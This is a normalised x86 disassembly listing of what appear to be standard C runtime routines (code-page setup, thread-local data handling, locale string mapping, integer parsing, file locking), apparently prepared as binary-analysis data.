cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100080d5
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_10008059
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_10007dc1
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10005100
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10008edb
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_10007d92
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_10007e25
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_10005100
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_10007d92
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_100082be
push 0x14
push r--data
call sub_10009700
or [ ebp - 0x20 ] 0xffffffff
call sub_1000895f
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_10007fb5
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_10008059
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_1000aaa8
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_10009745
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_100080d5
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_10007892
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_100079a5
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_100079a5
pop ecx
push 0xd
call sub_1000bf98
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000841f
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_100079a5
pop ecx
sub_10008476
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_10008505
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1000859e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_100079a5
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_100079a5
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_100079a5
push [ esi + 0xc0 ]
call sub_100079a5
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_1000c0f2
push [ esi + 0xd4 ]
call sub_100079a5
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_100079a5
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_100079a5
pop ecx
push [ esi + 0xb0 ]
call sub_100079a5
push [ esi + 0xbc ]
call sub_100079a5
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_100079a5
push [ esi + 0xbc ]
call sub_1000c4d2
pop ecx
pop ecx
push eax
call sub_100079a5
pop ecx
push eax
call sub_100079a5
push [ esi + 0xbc ]
call sub_1000c469
pop ecx
pop ecx
sub_100086e9
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_10008476
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_10008505
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_1000859e
pop ecx
sub_10008736
push 0xc
push r--data
call sub_10009700
call sub_1000895f
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1000bf98
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_100086e9
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100087a3
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1000895f
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10009745
retn
push 0x20
call sub_1000ae2f
sub_100087c1
mov edi edi
push esi
push [ rw-data ]
call [ TlsGetValue@IAT ]
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
push esi
push [ rw-data ]
call [ TlsSetValue@IAT ]
sub_100087f5
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_1000be68
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_10008832
push 0x8
push r--data
call sub_10009700
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ ebp + 0x8 ]
mov [ esi + 0x5c ] r--data
and [ esi + 0x8 ] 0x0
xor edi edi
inc edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0xc8 ] 0x43
mov [ esi + 0x14b ] 0x43
mov [ esi + 0x68 ] rw-data
push 0xd
call sub_1000bf98
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi + 0x68 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100088d4
push 0xc
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0xc ]
mov [ esi + 0x6c ] eax
test eax eax
jne r-xdata
push [ esi + 0x6c ]
call sub_10008476
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100088dd
call sub_10009745
retn
mov eax [ rw-data ]
mov [ esi + 0x6c ] eax
sub_100088e6
mov edi edi
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_100087c1
call eax
mov esi eax
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x214
push 0x1
call sub_1000aaed
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
push esi
call sub_100079a5
pop ecx
xor esi esi
push 0x0
push esi
call sub_10008832
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_10008979
push 0x8
push r--data
call sub_10009700
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10009745
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_100079a5
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_100079a5
pop ecx
push 0xd
call sub_1000bf98
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_100079a5
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008a93
push 0xc
call sub_1000bf98
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10008a9f
push esi
call sub_100079a5
pop ecx
push edi
call sub_10008505
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_100079a5
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1000859e
pop ecx
sub_10008aa8
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_10008979
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_10008b16
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_100087f5
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_100087b8
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1000abdc
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_1000be1e
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_100087f5
mov edi [ DecodePointer@IAT ]
push sub_10008979
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_1000aaed
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_10008832
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_10008c91
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10008edb
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_100056ac
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_10007b19
pop ecx
cmp eax ebx
je r-xdata
call sub_10008ef0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_100056ac
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_10007b19
pop ecx
cmp eax ebx
je r-xdata
call sub_10008ef0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_10008e78
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10008c91
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10008ebe
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
inc ecx
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_10008f1c
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_100056cc
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1000a5cf
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_10007892
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_10009147
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_10008f1c
add esp 0x14
pop ebp
retn
sub_10009178
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_1000aaed
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_1000aaed
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_10009249
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1000bf98
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_1000928a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1000bf98
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_100092bc
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
